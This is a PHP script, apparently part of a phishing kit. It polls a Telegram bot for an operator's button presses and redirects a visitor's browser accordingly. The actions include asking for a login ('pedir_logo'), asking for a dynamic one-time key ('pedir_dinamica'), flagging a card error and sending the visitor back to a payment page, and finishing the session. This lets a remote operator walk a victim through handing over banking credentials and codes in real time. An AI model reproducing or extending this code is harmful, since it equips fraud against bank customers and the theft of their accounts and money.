<?php
session_start();
header('Content-Type: application/json'); // Asegúrate de que la respuesta sea JSON

// Obtener el ID de transacción de la sesión
$transaction_id = $_SESSION['transaction_id'] ?? null;

if (!$transaction_id) {
    echo json_encode(['error' => 'ID de transacción no encontrado']);
    exit;
}

// Cargar la configuración del bot de Telegram
// Cargar la configuración del bot de Telegram
$config = require __DIR__ . '/botmaster.php'; // Asegúrate de que haya una barra

if (!$config || !isset($config['token'])) {
    echo json_encode(['error' => 'Configuración de Telegram inválida']);
    exit;
}

// URL de la API para obtener actualizaciones
$get_updates_url = "https://api.telegram.org/bot{$config['token']}/getUpdates";

// Realizar la solicitud a Telegram para obtener las actualizaciones
$ch = curl_init($get_updates_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$updates_response = curl_exec($ch);

if ($updates_response === false) {
    echo json_encode(['error' => 'Error al obtener actualizaciones de Telegram: ' . curl_error($ch)]);
    curl_close($ch);
    exit;
}

curl_close($ch);

// Convertir la respuesta en un array
$updates = json_decode($updates_response, true);

// Verificar si la respuesta contiene actualizaciones
if (isset($updates['result'])) {
    foreach ($updates['result'] as $update) {
        // Verificar si hay un callback_query
        if (isset($update['callback_query'])) {
            $callback_data = $update['callback_query']['data'];
            list($action, $id) = explode(':', $callback_data);

            if ($id === $transaction_id) {
                // Redirigir según la acción
                switch ($action) {
                    case 'pedir_logo':
                        echo json_encode(['redirect' => 'pedir_logo.php']);
                        exit;
                    case 'pedir_dinamica':
                        echo json_encode(['redirect' => 'pedir_dinamica.php']);
                        exit;
                    case 'error_tc':
                        echo json_encode(['redirect' => 'pago.php']);
                        exit;
                    case 'error_logo':
                        echo json_encode(['redirect' => 'pedir_logo.php']);
                        exit;
                    case 'finalizar':
                        echo json_encode(['redirect' => 'finish.html']);
                        exit;
                }
            }
        }
    }
}

// Si no hay actualizaciones relevantes, devolver null
echo json_encode(['redirect' => null]);
?>

